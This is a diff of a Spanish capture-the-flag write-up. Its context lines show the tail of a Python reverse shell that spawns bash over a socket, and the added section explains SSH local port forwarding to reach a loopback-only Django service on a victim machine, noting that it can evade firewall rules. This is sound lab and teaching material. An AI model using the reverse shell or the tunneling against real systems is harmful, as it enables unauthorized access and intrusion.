@@ -164,3 +164,63 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 import pty; pty.spawn("/bin/bash")
 ```
+
+---
+---
+# <font color=red>[+]</font> Explicación
+## <font color=red>[-]</font> Túnel SSH
+
+En auditorías de red, es común encontrar servicios que están configurados para escuchar únicamente en la interfaz de ***loopback (`127.0.0.1`)***. Esto significa que el servicio esté activo, es invisible para cualquier escaneo externo (como ***Nmap***) porque el servidor solo acepta conexiones que se originen dentro del sí si mismo.
+
+Para acceder a este servidor Django desde nuestra máquina atacante, utilizamos una técnica llamada ***Local Port Forwarding*** mediante SSH.
+### 1. Anatomía del comando
+```bash
+ssh -L 8081:127.0.0.1:8080 king@IP
+```
+
+Podemos desglosar la lógica de los números así:
+- `-L`: Indica que vamos a realizar un túnel de tipo ***Local***.
+- `8081`: Es el puerto que se abrirá en ***nuestra máquina atacante***. Es la "entrada" del túnel.
+- `127.0.0.1`: Es la dirección a la que el servidor remoto debe redirigir el tráfico una vez que llegue allí.
+- `8080`: Es el puerto de "salida" del túnel en el servidor remoto (donde corre *Django*).
+### 2. Cómo viaja la información?
+
+Imagina que el túnel SSH es una tubería segura que atraviesa el firewall:
+1. Nosotros abrimos el navegador en nuestra máquina atacante y entramos en `http://127.0.0.1:8081`.
+2. Nuestra máquina envía esa petición al puerto local ***8081***.
+3. El servicio SSH captura ese tráfico y lo envía ***encriptado*** a través de la conexión SSH ya establecida con el servidor.
+4. El servidor recibe el paquete, lo "desempaqueta" y lo entrega localmente al puerto ***8080***.
+5. Para el servidor Django, la petición parece venir de la propia máquina (`127.0.0.1`), por lo que ***permite la conexión***.
+#### Diagrama de Flujo: Túnel SSH Local (`-L`)
+
+```mermaid
+sequenceDiagram
+    participant B as Navegador (Kali)
+    participant C as Cliente SSH (Local)
+    participant S as Servidor SSH (Víctima)
+    participant D as Django (Localhost:8080)
+
+    Note over B,C: Puerto Local 8081
+    B->>C: Petición HTTP (GET /) a 127.0.0.1:8081
+    
+    Note over C,S: Túnel Encriptado (Puerto 22)
+    C->>S: Encapsula y envía tráfico por el túnel SSH
+    
+    Note over S,D: Interfaz Loopback (127.0.0.1)
+    S->>D: Desencapsula y entrega a 127.0.0.1:8080
+    
+    D-->>S: Respuesta (HTML/Data)
+    S-->>C: Envía respuesta por el túnel SSH
+    C-->>B: Entrega respuesta al navegador
+```
+
+### 3. Por qué es vital para este CTF?
+
+Sin el túnel, el servidor Django es inalcanzable. El túnel no solo nos permite ver la web, sino que ***encapsula*** nuestro tráfico dentro de una conexión legítima (SSH), lo que en un entorno real serviría para evadir reglas de firewall que bloquean puertos no estándar.
+
+>[!tip]
+>No debemos de confundir esta técnica de ***Local Port Forwarding*** con el ***Remote Port Forwarding*** (`-R`), ya que esta otra técnica hace lo contrario (trae un puerto de nuestra máquina atacante hacia la víctima).
+
+>[!Note]
+>Usar el puerto `8081` en local mientras el remoto es `8080` es una buena práctica para evitar conflictos si tenemos algo corriendo en el puerto `8080` de nuest
+>ra máquina (como ***Burp Suite***).
